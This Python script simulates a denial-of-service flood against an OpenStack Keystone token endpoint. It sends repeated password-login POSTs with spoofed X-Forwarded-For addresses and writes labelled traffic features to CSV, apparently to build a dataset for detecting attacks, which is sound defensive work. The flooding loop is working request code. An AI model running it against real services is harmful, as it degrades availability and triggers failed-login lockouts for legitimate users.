#!/usr/bin/env python3
"""
5_attack_dos.py
===============
Simulates Denial of Service flooding against Keystone.

Attack pattern:
- High-volume POST requests to /v3/auth/tokens from a small IP pool
- Extremely high req_rate_per_ip_60s (300-600/60s vs normal 2-10/60s)
- Low inter-request delay (0.15-0.25s) to sustain flood
- Key signal: req_rate_per_ip_60s >> normal baseline

Usage:
    python3 5_attack_dos.py --target 20000
"""

import requests
import time
import random
import csv
import os
import argparse
from datetime import datetime
from config import KEYSTONE_URL, OUTPUT_DIR, LOG_FIELDS, ATTACK_TARGET, ADMIN_DOMAIN

os.makedirs(OUTPUT_DIR, exist_ok=True)

# Small pool of source IPs (realistic DoS from a botnet)
SOURCE_IPS = [
    f"10.0.{random.randint(20, 30)}.{random.randint(1, 10)}"
    for _ in range(5)
]


class RateTracker:
    def __init__(self):
        self.requests = []
        self.fails    = []
        self.times    = []

    def add(self, ts, success, resp_ms):
        cutoff = ts - 60
        self.requests = [t for t in self.requests if t > cutoff]
        self.fails    = [t for t in self.fails    if t > cutoff]
        self.times    = [(t, r) for t, r in self.times if t > cutoff]
        self.requests.append(ts)
        self.times.append((ts, resp_ms))
        if not success:
            self.fails.append(ts)

    def req_rate(self):  return len(self.requests)
    def avg_resp(self):
        return sum(r for _, r in self.times) / len(self.times) if self.times else 0.0


def simulate_dos(target=ATTACK_TARGET, output_file=None):
    if output_file is None:
        output_file = os.path.join(OUTPUT_DIR, "raw_dos.csv")

    print(f"DoS simulation")
    print(f"Target: {target} requests → {output_file}\n")

    trackers     = {ip: RateTracker() for ip in SOURCE_IPS}
    rows         = []
    total        = 0
    recent_times = []

    while total < target:
        source_ip = random.choice(SOURCE_IPS)
        tracker   = trackers[source_ip]

        payload = {
            "auth": {
                "identity": {
                    "methods": ["password"],
                    "password": {
                        "user": {
                            "name": "admin",
                            "domain": {"name": ADMIN_DOMAIN},
                            "password": "flood",
                        }
                    },
                }
            }
        }
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": source_ip,
        }

        req_bytes = len(str(payload)) + len(str(headers))
        ts_start  = time.time()
        try:
            resp       = requests.post(
                f"{KEYSTONE_URL}/v3/auth/tokens",
                json=payload, headers=headers, timeout=3)
            resp_ms    = (time.time() - ts_start) * 1000
            status     = resp.status_code
            resp_bytes = len(resp.content)
        except Exception:
            resp_ms    = 3000
            status     = 0
            resp_bytes = 0

        success = 200 <= status < 400
        now     = time.time()
        tracker.add(now, success, resp_ms)
        recent_times.append(resp_ms)
        if len(recent_times) > 20:
            recent_times.pop(0)

        dt   = datetime.now()
        hour = dt.hour
        row  = {
            "timestamp":                dt.isoformat(),
            "hour_of_day":              hour,
            "minute_of_hour":           dt.minute,
            "day_of_week":              dt.weekday(),
            "is_business_hours":        1 if 9 <= hour <= 18 else 0,
            "http_method":              2,
            "endpoint_name":            "/v3/auth/tokens",
            "endpoint_category":        3,
            "path_depth":               3,
            "request_bytes":            req_bytes,
            "response_bytes":           resp_bytes,
            "status_code":              status,
            "status_class":             status // 100 if status > 0 else 0,
            "response_time_ms":         round(resp_ms, 2),
            "is_slow_request":          1 if resp_ms > 500 else 0,
            "is_auth_endpoint":         1,
            "is_admin_endpoint":        0,
            "user_id_hash":             0,
            "has_user_context":         1,
            "req_rate_per_ip_60s":      tracker.req_rate(),
            "fail_rate_per_ip_60s":     1.0,
            "user_req_count_60s":       tracker.req_rate(),
            "avg_response_time_recent": round(
                sum(recent_times) / len(recent_times), 2),
            "has_error_log":            1 if status >= 500 else 0,
            "is_burst":                 1,
            "is_repeated_fail":         1,
            "source_ip":                source_ip,
            "label":                    1,
            "attack_type":              "dos",
        }
        rows.append(row)
        total += 1

        if total % 200 == 0:
            avg_rt = sum(recent_times) / len(recent_times)
            print(f"  [{total}/{target}] "
                  f"req_rate={tracker.req_rate()}/60s "
                  f"avg_resp={avg_rt:.0f}ms")

        # Short delay — maintain high flood rate
        time.sleep(random.uniform(0.15, 0.25))

    with open(output_file, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=LOG_FIELDS)
        writer.writeheader()
        writer.writerows(rows)

    print(f"\n[DONE] {total} requests written → {output_file}")
    print(f"  Max req_rate: {max(r['req_rate_per_ip_60s'] for r in rows)}/60s")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DoS flood simulator")
    parser.add_argument("--target", type=int, default=ATTACK_TARGET)
    parser.add_argument("--output", type=str, default=None)
    args = parser.parse_args()
    simulate_dos(target=args.target, output_file=args.output)
